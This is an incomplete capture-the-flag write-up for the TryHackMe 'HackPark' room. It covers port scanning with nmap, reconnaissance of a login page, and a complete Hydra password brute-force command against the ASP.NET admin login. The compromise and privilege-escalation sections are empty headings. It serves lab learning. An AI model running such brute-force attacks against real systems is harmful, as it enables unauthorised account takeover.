# HackPark

| [![Jenkins](../../_static/images/it.png)](https://tryhackme.com/room/hackpark) |
|:--:|
| [https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark) |

SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate privileges to root.

## Brute-force login with Hydra

### Scanning

First run a simple port scan (without Ping)

	nmap -Pn -p- <IP address target machine> -oN portscan

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p,,, <IP address target machine> -oN servicescan

There is a web server running on port 80/tcp.

### Exploring

A short exploration of the site gave me a username and a login page. 

| ![Welcome to hackpark](../../_static/images/screenshot-hackpark.png)
|:--:|
| Welcome page clues |

A [reverse image search](https://www.reverseimagesearch.com/) gave the name of the clown.

### Brute-force admin

Identify what type of request the form is making to the webserver by going to the login page.

Copy the URL:

    http://10.10.79.198/Account/login.aspx?ReturnURL=/admin/

Type of request:

    # curl -s http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
        <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

Fire up Burpsuite, go to login page, set Burpsuite to intercept, and try to log in. Catch the 
`__VIEWSTATE` for use in Hydra.

    # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt <IP address target machine> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

## Compromise the machine 

Logged in as admin, click on the "About" link from the menu.

## Privilege escalation

## Privilege escalation without Metasploit 
